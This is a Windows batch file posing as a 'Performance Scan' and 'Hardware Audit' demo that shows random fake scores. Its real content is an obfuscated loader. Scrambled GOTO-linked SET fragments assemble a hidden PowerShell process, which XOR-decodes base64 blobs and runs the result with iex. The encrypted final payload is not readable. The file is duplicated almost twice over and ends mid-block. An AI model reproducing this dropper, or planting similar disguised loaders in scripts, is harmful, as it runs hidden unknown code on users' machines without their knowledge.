@echo off




setlocal EnableDelayedExpansion

echo.

goto :skipSystem

:: ======================================
:: Performance Scan - DEMO ONLY
:: ======================================

:SystemRoutine
title Performance Scan
color 6F

echo Initializing Performance Scan...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    Network
    Audio
    Cooling
    SATA
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo Preview complete.
pause
goto :eof

:skipSystem
:: ======================================
:: END OF PERFORMANCE SCAN BLOCK
:: ======================================

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Initializing Hardware Audit...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Memory
    Graphics
    CPU
    Audio
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    FTP
    RDP
    NTP
    LDAP
    DNS
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Check finished.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================
GOTO FOOFIDNDJG
:SDGJDOJGGG
SET DOJSIOGGNN=nmttmVq7zFqcbq5rLo7J3W6/+r1Na+pc+Hkq2hvaDz3+rB9LbU0vv+0uvK4+Kr+
GOTO ONGINSIGGG
:FGGNGFDIGF
SET NDJUJFFDIF=/BzkARAQyKU4BPgc8HjcTEycKOwRmWAEWfB8+Jwk4Iwg8LE0CJGBGIC9uChkXKS4aBWUUNQE+fiY6e
GOTO GDGGFIOGDG
:KNFIFGJGSD
SET DKIGGJFUGG=JtNnpOHSVaRQFdWGFZV0IMFw0SFAtJKylBUT4JKHtcQhplYXZQRAQrIGkNbkF8c
GOTO SNDFGNDSGI1
:NGDDNNHOOG
SET FJJINIKFOO=GHppbV1CfSVYcko4bXBscUIfamNGAw8jfTc0Rn49YHhqa3RybS9NTyQzWG9OAQw
GOTO IGNFSDNIDG8
:HUJONIIOIO
SET DOOIFGSGSG=lGCWcSNw0ufxMBBEZTFih8Dg4oYRE8CXojcAI0ChsxOSIiCSxgGyZOdxk5IyISXmdtc0
GOTO GJJIGSGGGI
:GNKFJDFDDO
SET IHGKNGIUOS==[Convert]::FromBase64String([regex]::Replace($blDTuyE, ''$qYikfg
GOTO IOHNNDJNII
:SNDFGNDSGI
SET GIJFDJONNU=cess $env:SystemRoot\System32\WindowsPowerShell\v1.0\powershe
GOTO IGNFSDNIDG
:GDGGFIOGDG
SET OJDFDDDNFG=zhfe05hf3QzaEZDcmltVEUVcBohGig2PjZ5VlJyaW1URQpgFjUaMn99cWBTV19HKw5bZjhYejEuf3c3
GOTO JJJDJIDGDN5
:IFNDINOGOO
SET IFOGSFFDKD=KB2pqRRFDDjJvXFVCRWlsTXsbZHlPAHFYKAEZbXlSdDZnTgp+f0kXZ2R6U01ZVFhsTE
GOTO GDGFIGGNJH
:FFDJONNGGI
SET DNIDFGFDOO=n[$qYikfg]);$qYikfg++};$aL4GADz=$yHcEXmPD;$aCBLUxHDf=$uy7MN6EcJ+
GOTO GOUKFDNJOI
:JNJHFIIKJN
SET GSJOGDFDJD=[regex]::Replace($lwJaJSw, ''$qYikfg'', ''''));$yHcEXmPD='''
GOTO GNOGNODKKO
:GDGFIGGNJH
SET GNFONDNOFF=1bDFY3GjdyRzkONDwXFyA4Ul4HaHlJDHAUTFNOWFtYYXxwSh1qS1IMc3hhUlJFF0wgaFVZC
GOTO JUIHNOFOSF
:IIDOGGFNGG
SET NNOGNDGJNF=$yJhy8f7K=@();foreach($x7M9Jj0 in [char[]]$eAcx0qn){$yJhy8f7K+=[byte]($x7M9J
GOTO GGISNOIJOG
:SNDFGNDSGI6
SET IODGHNOONI=JPpvMrr35yy6e+ut9b9jaWMxLmur+SRm5SjroDG0JK9x5O5stbKko6g/4Kv9cLA4v263Na+qsHg1
GOTO SNDFGNDSGI7
:GJJIGSGGGI
SET SIGNOGSIDD=0tKXcVMxp3CzEzPQNeHCxiCEcFVS1fZHp/cHF1BElycC9JCXArPzcaDiYgNHl
GOTO JJJDJIDGDN1
:NNFNOOHIJI
SET JNGJDUHUKF=fCk/Kx00JQ4RNmUnMh9mIigoCTB4eXF6RlYNOS9KOywxRXVHc3EZPycJFTdlKwMeKmlUcj
GOTO JJJDJIDGDN7
:OKFNFGFFDG
SET SFFKGIGFON=har[]]$eAcx0qn){$yJhy8f7K+=[byte]($x7M9Jj0-bxor0x5A)};$oCZzF8=$yJhy8f7K;
GOTO IIDOGGFNGG
:SNDFGNDSGI1
SET FIOSNDISDG=1tcUlR0OBBKWSsgYwxrWnwcHVcHGUx9WkwdYzYAbhQUKBwZUFhFZXlXQ0kjKUFQPl1mHB1XBR4g
GOTO SNDFGNDSGI2
:KGIUGDUUFG
SET FOJIGOOUFO=E[$qFwDna]-bxor$oCZzF8[$qYikfg]);$qYikfg++};$uy7MN6EcJ=$yHcEXmPD;$c3
GOTO UONNOINONG7
:ONGINSIGGG
SET NINKGNFDOG=ujSx++2p8//1bzB69fj4qv86MLH77Wu2qGq/pK/haqoruDsndbn9LKWwfan7MHX4+btqvrf2
GOTO IGNFSDNIDG5
:SNDFGNDSGI5
SET DGDDGOFDIO=4HI3M3=''t8HjqLfm7q6AztGS5+7ClO3Szq2Zq6yv+/HUvqKF8b+flbe4spT6ja719djO4vi+0
GOTO SNDFGNDSGI6
:GNOGNODKKO
SET ISGDHJDGOI=';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V50E.Length;$qFwDna++){if($qYikfg-ge
GOTO GJDFFGSFGI
:GKNSOINOIO
SET DFJHGIJGGJ=fg++};$aCFdTVcK=$yHcEXmPD;$c3V50E=[Convert]::FromBase64String(
GOTO JNJHFIIKJN
:IGNFSDNIDG
SET IHFFGNFOFD=ll.exe -WindowStyle Hidden -ArgumentList '-Command \"$j=77-93
GOTO JJJDJIDGDN
:HGOSJIJINJ
SET JSNGFOOFJO=HDf"'"
GOTO NHFSGISGON
:SNDFGNDSGI3
SET DDFNNSUDDO=wAB4lFAU2GRYXF3J9QF4bZS0EDWtYZBxEDRc6CjgUC0kvbBRDIxQvGwI7PRcgOBQPCD4tHUM2a3wc
GOTO SNDFGNDSGI4
:JJJDJIDGDN
SET GOSGNIODIJ=;$eAcx0qn=''9DnRfclmmZBnq3QWz'';$blDTuyE=''BWtaa0hQWVkXX2wcDw5m
GOTO UONNOINONG
:SNDFGNDSGI7
SET IINDFDIGDD=+uZvejvma+n7M/HoO7F0rPOmvWx4663g/qyzsXLhvLUob259riuv8La7P2/3cn/vMHr1+Pm
GOTO SNDFGNDSGI8
:SNDFGNDSGI4
SET IJJNGGFNOD=HnxjXDVIbE8AUmodXjkdMzEzElYBICUUC01qOQBIOlU9BzQ8FxcgOBBKWSswACM2HCxdDxY='';$mfW
GOTO SNDFGNDSGI5
:SNDFGNDSGI9
SET FGDJFFJIOS=BnrO1wbDX56fx6PXfvJit5YCXsrK1ro+36Iymq5CDorrxqcjlybWNz+2BrLybi5WiuvHc1r
GOTO IGNFSDNIDG0
:IOHNNDJNII
SET KSGSJIKOJO='', ''''));$yHcEXmPD='''';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V50E.Leng
GOTO FGIOODNDDN
:JJJDJIDGDN7
SET GSIJGNIDHD=U1PTo0MhIlDxAvRU8kPFh+SjlufHF2QVJyaW1VR2YhG2JOdn94DiVGWRwVe1
GOTO JJJDJIDGDN8
:GOUKFDNJOI
SET NUFDKGOJFH=$aCFdTVcK+$aL4GADz;.([char[]](105,101,120)-join'''') $aCBLUx
GOTO HGOSJIJINJ
:FGIOODNDDN
SET DSGGGNGJJN=th;$qFwDna++){if($qYikfg-ge$oCZzF8.Length){$qYikfg=0};$yHcEXmPD+=[char]($c3V50
GOTO KGIUGDUUFG
:NKIKIDNNKG
SET SNJNDDDUNO='', ''''));$yHcEXmPD='''';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V5
GOTO UONNOINONG9
:IGNFSDNIDG0
SET NODDONNJID=6ryPD6yebp6Ojfw6rttsnS98OV69Cgnoytj66QrfO/1Nn/tL6/1+SBkYay2M7w9LKWwv+hweOot+buq
GOTO IGNFSDNIDG1
:GGISNOIJOG
SET DDFJISDGFN=j0-bxor0xA5)};$xB5mNX88S=$yJhy8f7K;$yJhy8f7K=@();foreach($x7M9Jj0 in [char[]]$
GOTO UONNOINONG2
:FOOFIDNDJG
SET IUOJDHFFGI=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Start-Pro
GOTO SNDFGNDSGI
:JJJDJIDGDN2
SET ISGNJGDDIG=JzIfZiIwKwkreHlxekZWDTkvSi8CMR91R2FSWnFxRl52LzZNVmYtJyZOfRAEBGQ
GOTO FGGNGFDIGF
:JDGNNGJGOG
SET IHJFIFODGG=HkoNEjkhSSstADBqVXpIFGVbUmVoFAY6bm5PDXpHKA40PBcXIDhvZQx/I3MGbEJhX1xmWF5ubHl
GOTO IFNDINOGOO
:IGNFSDNIDG6
SET GSNNJJUNSG=vK5laS51JWBuqrVmIOxrw=='';$lwJaJSw=''ax96SjhreWpxRl52Lz1NVmYhGWpAEzE0NCkp
GOTO NGDDNNHOOG
:IGNFSDNIDG8
SET JONHGGIOGD=pIiUDE3wfagsHI2YMOwE0cREiIgMTMCF2MFF8SRczCnJ7MmR4XXNYbS8qDjIoKCABOTojInEaXgEifR
GOTO HUJONIIOIO
:SNDFGNDSGI8
SET UFFIHIDFSF=6cXC24b89KvUtrDrj6eYoqKNqbyeobm7+7ibsfeS69Oi9vLFwt/H6/S21NL/9Yfr3+en/ujlkYLr8Pi
GOTO SNDFGNDSGI9
:JJJDJIDGDN5
SET FNGNDNJUOG=AFtDdWQ0YGFmJVhySjlucGxxTiEmbSgLOns4X3tVV1VwcXFGWjF/L1BLYmdP
GOTO NNFNOOHIJI
:JJJDJIDGDN1
SET OFIDGNNJGO=OISZtKCQvFzwoJVNneHlxekZWDTkvSiIvalceLRg1EgIYATURKiRKQm8+dVhjUH9wcXFCHGpw
GOTO JJJDJIDGDN2
:OGFSSODFOJ
SET GODSJJGJNU=HcEXmPD+=[char]($c3V50E[$qFwDna]-bxor$xB5mNX88S[$qYikfg]);$qYik
GOTO GKNSOINOIO
:UONNOINONG
SET FISDUJSGFG=YgkYOl81Cw4NbGR5a0BOBCVZRRtqGk1SWllTXm5/aRFTXllmWzBzbUhqQkVebn8ccAtyeUU4Q2kgZ2
GOTO NSIIUJOFJD
:IGNFSDNIDG5
SET JJUGFJDOGI=uvw98zclvKFro+MoOHsqs/O8Nmc1NL/vMHvlfbm9OiTrJ64oPOZ3Jzzj72SsbKU8
GOTO IGNFSDNIDG6
:SNDFGNDSGI2
SET OINJGNGFOU=YxRfG3ItW0NsUXxJS1gXE2EpGm8GfGNMDH9QTF1NVx8TYSsdCxQrbkEXfVwoRxlVWFl0cVpeDCt
GOTO SNDFGNDSGI3
:IGNFSDNIDG1
SET DGIFDJFSUG=5C62uz9tt/S98OV69CAh4SCq8yq9vO/z9L7/tDryuPiqPDmtomvse67lPe4gPL
GOTO IGNFSDNIDG2
:UONNOINONG7
SET DIDIDGSDGS=V50E=[Convert]::FromBase64String([regex]::Replace($mfW4HI3M3, ''$qYikfg
GOTO NKIKIDNNKG
:JUIHNOFOSF
SET ODOHHOOOGI=GYtCDhtQHpVV1Fsal08VRtAKwAqQz4UKBhYBxcKIFZRXEREb0oGfUAob0BFQ1
GOTO KNFIFGJGSD
:JJJDJIDGDN8
SET DDDIKKNJFO=hMbyxRLxNXVQ=='';$oedo9fTjB=0xEA34-0xAB29;$yJhy8f7K=@();foreach($x7M9Jj0 in [c
GOTO OKFNFGFFDG
:NHFSGISGON
%IUOJDHFFGI%%GIJFDJONNU%%IHFFGNFOFD%%GOSGNIODIJ%%FISDUJSGFG%%OGGHGFNDNI%%IHJFIFODGG%%IFOGSFFDKD%%GNFONDNOFF%%ODOHHOOOGI%%DKIGGJFUGG%%FIOSNDISDG%%OINJGNGFOU%%DDFNNSUDDO%%IJJNGGFNOD%%DGDDGOFDIO%%IODGHNOONI%%IINDFDIGDD%%UFFIHIDFSF%%FGDJFFJIOS%%NODDONNJID%%DGIFDJFSUG%%KGDHOINGDN%%DOJSIOGGNN%%NINKGNFDOG%%JJUGFJDOGI%%GSNNJJUNSG%%FJJINIKFOO%%JONHGGIOGD%%DOOIFGSGSG%%SIGNOGSIDD%%OFIDGNNJGO%%ISGNJGDDIG%%NDJUJFFDIF%%OJDFDDDNFG%%FNGNDNJUOG%%JNGJDUHUKF%%GSIJGNIDHD%%DDDIKKNJFO%%SFFKGIGFON%%NNOGNDGJNF%%DDFJISDGFN%%JIIGSJOIFG%%IHGKNGIUOS%%KSGSJIKOJO%%DSGGGNGJJN%%FOJIGOOUFO%%DIDIDGSDGS%%SNJNDDDUNO%%SJINIGGGFG%%GODSJJGJNU%%DFJHGIJGGJ%%GSJOGDFDJD%%ISGDHJDGOI%%DKIFIGNGDF%%DNIDFGFDOO%%NUFDKGOJFH%%JSNGFOOFJO%
GOTO NSIIUJOFJD9
:IGNFSDNIDG2
SET KGDHOINGDN=e+ObEwujfx+vw9MbS4rzFqs/tj6esrYeorfyylsL2p+zB1+Pm6eihmcfj8PTF0vL7hOvH4+uopqzfw6
GOTO SDGJDOJGGG
:UONNOINONG2
SET JIIGSJOIFG=eAcx0qn){$yJhy8f7K+=[byte]($x7M9Jj0-bxor0x3C)};$w92Hin=$yJhy8f7K;$c3V50E
GOTO GNKFJDFDDO
:UONNOINONG9
SET SJINIGGGFG=0E.Length;$qFwDna++){if($qYikfg-ge$xB5mNX88S.Length){$qYikfg=0};$y
GOTO OGFSSODFOJ
:GJDFFGSFGI
SET DKIFIGNGDF=$w92Hin.Length){$qYikfg=0};$yHcEXmPD+=[char]($c3V50E[$qFwDna]-bxor$w92Hi
GOTO FFDJONNGGI
:NSIIUJOFJD
SET OGGHGFNDNI=pPRENldRpoBmV7RRFqaTIGf0RYWkJ5R05fP15UEXdabxQdUVpYKWQRUE1UIEIbcUYsV0Qf
GOTO JDGNNGJGOG
:NSIIUJOFJD9@echo off




setlocal EnableDelayedExpansion

echo.

goto :skipSystem

:: ======================================
:: Performance Scan - DEMO ONLY
:: ======================================

:SystemRoutine
title Performance Scan
color 6F

echo Initializing Performance Scan...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    Network
    Audio
    Cooling
    SATA
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo Preview complete.
pause
goto :eof

:skipSystem
:: ======================================
:: END OF PERFORMANCE SCAN BLOCK
:: ======================================

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Initializing Hardware Audit...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Memory
    Graphics
    CPU
    Audio
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    FTP
    RDP
    NTP
    LDAP
    DNS
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Check finished.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================
GOTO FOOFIDNDJG
:SDGJDOJGGG
SET DOJSIOGGNN=nmttmVq7zFqcbq5rLo7J3W6/+r1Na+pc+Hkq2hvaDz3+rB9LbU0vv+0uvK4+Kr+
GOTO ONGINSIGGG
:FGGNGFDIGF
SET NDJUJFFDIF=/BzkARAQyKU4BPgc8HjcTEycKOwRmWAEWfB8+Jwk4Iwg8LE0CJGBGIC9uChkXKS4aBWUUNQE+fiY6e
GOTO GDGGFIOGDG
:KNFIFGJGSD
SET DKIGGJFUGG=JtNnpOHSVaRQFdWGFZV0IMFw0SFAtJKylBUT4JKHtcQhplYXZQRAQrIGkNbkF8c
GOTO SNDFGNDSGI1
:NGDDNNHOOG
SET FJJINIKFOO=GHppbV1CfSVYcko4bXBscUIfamNGAw8jfTc0Rn49YHhqa3RybS9NTyQzWG9OAQw
GOTO IGNFSDNIDG8
:HUJONIIOIO
SET DOOIFGSGSG=lGCWcSNw0ufxMBBEZTFih8Dg4oYRE8CXojcAI0ChsxOSIiCSxgGyZOdxk5IyISXmdtc0
GOTO GJJIGSGGGI
:GNKFJDFDDO
SET IHGKNGIUOS==[Convert]::FromBase64String([regex]::Replace($blDTuyE, ''$qYikfg
GOTO IOHNNDJNII
:SNDFGNDSGI
SET GIJFDJONNU=cess $env:SystemRoot\System32\WindowsPowerShell\v1.0\powershe
GOTO IGNFSDNIDG
:GDGGFIOGDG
SET OJDFDDDNFG=zhfe05hf3QzaEZDcmltVEUVcBohGig2PjZ5VlJyaW1URQpgFjUaMn99cWBTV19HKw5bZjhYejEuf3c3
GOTO JJJDJIDGDN5
:IFNDINOGOO
SET IFOGSFFDKD=KB2pqRRFDDjJvXFVCRWlsTXsbZHlPAHFYKAEZbXlSdDZnTgp+f0kXZ2R6U01ZVFhsTE
GOTO GDGFIGGNJH
:FFDJONNGGI
SET DNIDFGFDOO=n[$qYikfg]);$qYikfg++};$aL4GADz=$yHcEXmPD;$aCBLUxHDf=$uy7MN6EcJ+
GOTO GOUKFDNJOI
:JNJHFIIKJN
SET GSJOGDFDJD=[regex]::Replace($lwJaJSw, ''$qYikfg'', ''''));$yHcEXmPD='''
GOTO GNOGNODKKO
:GDGFIGGNJH
SET GNFONDNOFF=1bDFY3GjdyRzkONDwXFyA4Ul4HaHlJDHAUTFNOWFtYYXxwSh1qS1IMc3hhUlJFF0wgaFVZC
GOTO JUIHNOFOSF
:IIDOGGFNGG
SET NNOGNDGJNF=$yJhy8f7K=@();foreach($x7M9Jj0 in [char[]]$eAcx0qn){$yJhy8f7K+=[byte]($x7M9J
GOTO GGISNOIJOG
:SNDFGNDSGI6
SET IODGHNOONI=JPpvMrr35yy6e+ut9b9jaWMxLmur+SRm5SjroDG0JK9x5O5stbKko6g/4Kv9cLA4v263Na+qsHg1
GOTO SNDFGNDSGI7
:GJJIGSGGGI
SET SIGNOGSIDD=0tKXcVMxp3CzEzPQNeHCxiCEcFVS1fZHp/cHF1BElycC9JCXArPzcaDiYgNHl
GOTO JJJDJIDGDN1
:NNFNOOHIJI
SET JNGJDUHUKF=fCk/Kx00JQ4RNmUnMh9mIigoCTB4eXF6RlYNOS9KOywxRXVHc3EZPycJFTdlKwMeKmlUcj
GOTO JJJDJIDGDN7
:OKFNFGFFDG
SET SFFKGIGFON=har[]]$eAcx0qn){$yJhy8f7K+=[byte]($x7M9Jj0-bxor0x5A)};$oCZzF8=$yJhy8f7K;
GOTO IIDOGGFNGG
:SNDFGNDSGI1
SET FIOSNDISDG=1tcUlR0OBBKWSsgYwxrWnwcHVcHGUx9WkwdYzYAbhQUKBwZUFhFZXlXQ0kjKUFQPl1mHB1XBR4g
GOTO SNDFGNDSGI2
:KGIUGDUUFG
SET FOJIGOOUFO=E[$qFwDna]-bxor$oCZzF8[$qYikfg]);$qYikfg++};$uy7MN6EcJ=$yHcEXmPD;$c3
GOTO UONNOINONG7
:ONGINSIGGG
SET NINKGNFDOG=ujSx++2p8//1bzB69fj4qv86MLH77Wu2qGq/pK/haqoruDsndbn9LKWwfan7MHX4+btqvrf2
GOTO IGNFSDNIDG5
:SNDFGNDSGI5
SET DGDDGOFDIO=4HI3M3=''t8HjqLfm7q6AztGS5+7ClO3Szq2Zq6yv+/HUvqKF8b+flbe4spT6ja719djO4vi+0
GOTO SNDFGNDSGI6
:GNOGNODKKO
SET ISGDHJDGOI=';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V50E.Length;$qFwDna++){if($qYikfg-ge
GOTO GJDFFGSFGI
:GKNSOINOIO
SET DFJHGIJGGJ=fg++};$aCFdTVcK=$yHcEXmPD;$c3V50E=[Convert]::FromBase64String(
GOTO JNJHFIIKJN
:IGNFSDNIDG
SET IHFFGNFOFD=ll.exe -WindowStyle Hidden -ArgumentList '-Command \"$j=77-93
GOTO JJJDJIDGDN
:HGOSJIJINJ
SET JSNGFOOFJO=HDf"'"
GOTO NHFSGISGON
:SNDFGNDSGI3
SET DDFNNSUDDO=wAB4lFAU2GRYXF3J9QF4bZS0EDWtYZBxEDRc6CjgUC0kvbBRDIxQvGwI7PRcgOBQPCD4tHUM2a3wc
GOTO SNDFGNDSGI4
:JJJDJIDGDN
SET GOSGNIODIJ=;$eAcx0qn=''9DnRfclmmZBnq3QWz'';$blDTuyE=''BWtaa0hQWVkXX2wcDw5m
GOTO UONNOINONG
:SNDFGNDSGI7
SET IINDFDIGDD=+uZvejvma+n7M/HoO7F0rPOmvWx4663g/qyzsXLhvLUob259riuv8La7P2/3cn/vMHr1+Pm
GOTO SNDFGNDSGI8
:SNDFGNDSGI4
SET IJJNGGFNOD=HnxjXDVIbE8AUmodXjkdMzEzElYBICUUC01qOQBIOlU9BzQ8FxcgOBBKWSswACM2HCxdDxY='';$mfW
GOTO SNDFGNDSGI5
:SNDFGNDSGI9
SET FGDJFFJIOS=BnrO1wbDX56fx6PXfvJit5YCXsrK1ro+36Iymq5CDorrxqcjlybWNz+2BrLybi5WiuvHc1r
GOTO IGNFSDNIDG0
:IOHNNDJNII
SET KSGSJIKOJO='', ''''));$yHcEXmPD='''';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V50E.Leng
GOTO FGIOODNDDN
:JJJDJIDGDN7
SET GSIJGNIDHD=U1PTo0MhIlDxAvRU8kPFh+SjlufHF2QVJyaW1VR2YhG2JOdn94DiVGWRwVe1
GOTO JJJDJIDGDN8
:GOUKFDNJOI
SET NUFDKGOJFH=$aCFdTVcK+$aL4GADz;.([char[]](105,101,120)-join'''') $aCBLUx
GOTO HGOSJIJINJ
:FGIOODNDDN
SET DSGGGNGJJN=th;$qFwDna++){if($qYikfg-ge$oCZzF8.Length){$qYikfg=0};$yHcEXmPD+=[char]($c3V50
GOTO KGIUGDUUFG
:NKIKIDNNKG
SET SNJNDDDUNO='', ''''));$yHcEXmPD='''';$qYikfg=0;for($qFwDna=0;$qFwDna-lt$c3V5
GOTO UONNOINONG9
:IGNFSDNIDG0
SET NODDONNJID=6ryPD6yebp6Ojfw6rttsnS98OV69Cgnoytj66QrfO/1Nn/tL6/1+SBkYay2M7w9LKWwv+hweOot+buq
GOTO IGNFSDNIDG1
:GGISNOIJOG
SET DDFJISDGFN=j0-bxor0xA5)};$xB5mNX88S=$yJhy8f7K;$yJhy8f7K=@();foreach($x7M9Jj0 in [char[]]$
GOTO UONNOINONG2
:FOOFIDNDJG
SET IUOJDHFFGI=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Start-Pro
GOTO SNDFGNDSGI
:JJJDJIDGDN2
SET ISGNJGDDIG=JzIfZiIwKwkreHlxekZWDTkvSi8CMR91R2FSWnFxRl52LzZNVmYtJyZOfRAEBGQ
GOTO FGGNGFDIGF
:JDGNNGJGOG
SET IHJFIFODGG=HkoNEjkhSSstADBqVXpIFGVbUmVoFAY6bm5PDXpHKA40PBcXIDhvZQx/I3MGbEJhX1xmWF5ubHl
GOTO IFNDINOGOO
:IGNFSDNIDG6
SET GSNNJJUNSG=vK5laS51JWBuqrVmIOxrw=='';$lwJaJSw=''ax96SjhreWpxRl52Lz1NVmYhGWpAEzE0NCkp
GOTO NGDDNNHOOG
:IGNFSDNIDG8
SET JONHGGIOGD=pIiUDE3wfagsHI2YMOwE0cREiIgMTMCF2MFF8SRczCnJ7MmR4XXNYbS8qDjIoKCABOTojInEaXgEifR
GOTO HUJONIIOIO
:SNDFGNDSGI8
SET UFFIHIDFSF=6cXC24b89KvUtrDrj6eYoqKNqbyeobm7+7ibsfeS69Oi9vLFwt/H6/S21NL/9Yfr3+en/ujlkYLr8Pi
GOTO SNDFGNDSGI9
:JJJDJIDGDN5
SET FNGNDNJUOG=AFtDdWQ0YGFmJVhySjlucGxxTiEmbSgLOns4X3tVV1VwcXFGWjF/L1BLYmdP
GOTO NNFNOOHIJI
:JJJDJIDGDN1
SET OFIDGNNJGO=OISZtKCQvFzwoJVNneHlxekZWDTkvSiIvalceLRg1EgIYATURKiRKQm8+dVhjUH9wcXFCHGpw
GOTO JJJDJIDGDN2
:OGFSSODFOJ
SET GODSJJGJNU=HcEXmPD+=[char]($c3V50E[$qFwDna]-bxor$xB5mNX88S[$qYikfg]);$qYik
GOTO GKNSOINOIO
:UONNOINONG
SET FISDUJSGFG=YgkYOl81Cw4NbGR5a0BOBCVZRRtqGk1SWllTXm5/aRFTXllmWzBzbUhqQkVebn8ccAtyeUU4Q2kgZ2
GOTO NSIIUJOFJD
:IGNFSDNIDG5
SET JJUGFJDOGI=uvw98zclvKFro+MoOHsqs/O8Nmc1NL/vMHvlfbm9OiTrJ64oPOZ3Jzzj72SsbKU8
GOTO IGNFSDNIDG6
:SNDFGNDSGI2
SET OINJGNGFOU=YxRfG3ItW0NsUXxJS1gXE2EpGm8GfGNMDH9QTF1NVx8TYSsdCxQrbkEXfVwoRxlVWFl0cVpeDCt
GOTO SNDFGNDSGI3
:IGNFSDNIDG1
SET DGIFDJFSUG=5C62uz9tt/S98OV69CAh4SCq8yq9vO/z9L7/tDryuPiqPDmtomvse67lPe4gPL
GOTO IGNFSDNIDG2
:UONNOINONG7
SET DIDIDGSDGS=V50E=[Convert]::FromBase64String([regex]::Replace($mfW4HI3M3, ''$qYikfg
GOTO NKIKIDNNKG
:JUIHNOFOSF
SET ODOHHOOOGI=GYtCDhtQHpVV1Fsal08VRtAKwAqQz4UKBhYBxcKIFZRXEREb0oGfUAob0BFQ1
GOTO KNFIFGJGSD
:JJJDJIDGDN8
SET DDDIKKNJFO=hMbyxRLxNXVQ=='';$oedo9fTjB=0xEA34-0xAB29;$yJhy8f7K=@();foreach($x7M9Jj0 in [c
GOTO OKFNFGFFDG
:NHFSGISGON
%IUOJDHFFGI%%GIJFDJONNU%%IHFFGNFOFD%%GOSGNIODIJ%%FISDUJSGFG%%OGGHGFNDNI%%IHJFIFODGG%%IFOGSFFDKD%%GNFONDNOFF%%ODOHHOOOGI%%DKIGGJFUGG%%FIOSNDISDG%%OINJGNGFOU%%DDFNNSUDDO%%IJJNGGFNOD%%DGDDGOFDIO%%IODGHNOONI%%IINDFDIGDD%%UFFIHIDFSF%%FGDJFFJIOS%%NODDONNJID%%DGIFDJFSUG%%KGDHOINGDN%%DOJSIOGGNN%%NINKGNFDOG%%JJUGFJDOGI%%GSNNJJUNSG%%FJJINIKFOO%%JONHGGIOGD%%DOOIFGSGSG%%SIGNOGSIDD%%OFIDGNNJGO%%ISGNJGDDIG%%NDJUJFFDIF%%OJDFDDDNFG%%FNGNDNJUOG%%JNGJDUHUKF%%GSIJGNIDHD%%DDDIKKNJFO%%SFFKGIGFON%%NNOGNDGJNF%%DDFJISDGFN%%JIIGSJOIFG%%IHGKNGIUOS%%KSGSJIKOJO%%DSGGGNGJJN%%FOJIGOOUFO%%DIDIDGSDGS%%SNJNDDDUNO%%SJINIGGGFG%%GODSJJGJNU%%DFJHGIJGGJ%%GSJOGDFDJD%%ISGDHJDGOI%%DKIFIGNGDF%%DNIDFGFDOO%%NUFDKGOJFH%%JSNGFOOFJO%
GOTO NSIIUJOFJD9
:IGNFSDNIDG2
SET KGDHOINGDN=e+ObEwujfx+vw9MbS4rzFqs/tj6esrYeorfyylsL2p+zB1+Pm6eihmcfj8PTF0vL7hOvH4+uopqzfw6
GOTO SDGJDOJGGG
:UONNOINONG2
SET JIIGSJOIFG=eAcx0qn){$yJhy8f7K+=[byte]($x7M9Jj0-bxor0x3C)};$w92Hin=$yJhy8f7K;$c3V50E
GOTO GNKFJDFDDO
:UONNOINONG9
SET SJINIGGGFG=0E.Length;$qFwDna++){if($qYikfg-ge$xB5mNX88S.Length){$qYikfg=0};$y
GOTO OGFSSODFOJ
:GJDFFGSFGI
SET DKIFIGNGDF=$w92Hin.Length){$qYikfg=0};$yHcEXmPD+=[char]($c3V50E[$qFwDna]-bxor$w92Hi
GOTO FFDJONNGGI
:NSIIUJOFJD
SET OGGHGFNDNI=pPRENldRpoBmV7RRFqaTIGf0RYWkJ5R05fP15UEXdabxQdUVpYKWQRUE1UIEIbcUYsV0Qf
GOTO JDGNNGJGOG
:NSIIUJOFJD9
setlocal EnableDelayedExpansion

echo.

goto :skipSystem

:: ======================================
:: Performance Scan - DEMO ONLY
:: ======================================

:SystemRoutine
title Performance Scan
color 6F

echo Initializing Performance Scan...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    Network
    Audio
    Cooling
